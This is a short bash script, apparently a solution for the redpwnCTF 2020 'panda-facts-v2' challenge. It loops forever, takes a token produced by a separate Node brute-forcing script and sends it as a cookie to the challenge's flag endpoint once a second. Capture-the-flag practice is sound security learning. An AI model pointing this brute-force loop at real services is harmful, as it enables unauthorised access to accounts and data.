#!/bin/bash
while :
do
	payload=$(node brute-force-for-valid-token.js)
    echo "${payload}"
	curl 'https://panda-facts-v2.2020.redpwnc.tf/api/flag' -H "cookie: token=${payload}"
    sleep 1
done